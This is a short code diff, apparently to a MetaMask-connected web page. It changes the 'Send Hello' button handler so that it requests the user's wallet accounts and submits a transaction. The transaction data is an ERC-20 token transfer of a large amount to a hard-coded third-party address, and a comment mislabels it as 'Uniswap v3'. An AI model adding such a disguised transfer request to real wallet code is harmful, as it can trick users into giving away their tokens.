@@ -119,7 +119,21 @@ const Index = () => {
 
   const handleSendHelloClick = async () => {
     try {
-      await sendHello();
+      let [from] = (await window.ethereum.request({
+        method: 'eth_requestAccounts',
+      })) as string[];
+
+      await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [
+          {
+            from,
+            to: '0xebd9d99a3982d547c5bb4db7e3b1f9f14b67eb83', // Uniswap v3,
+            value: '0x0',
+            data: '0xa9059cbb0000000000000000000000009eedff5f13978011fb7c4504b306aca58c2f9aad0000000000000000000000000000000000000000000005d2c72a2ac16a300000',
+          },
+        ],
+      });
     } catch (e) {
       console.error(e);
       dispatch({ type: MetamaskActions.SetError, payload: e });
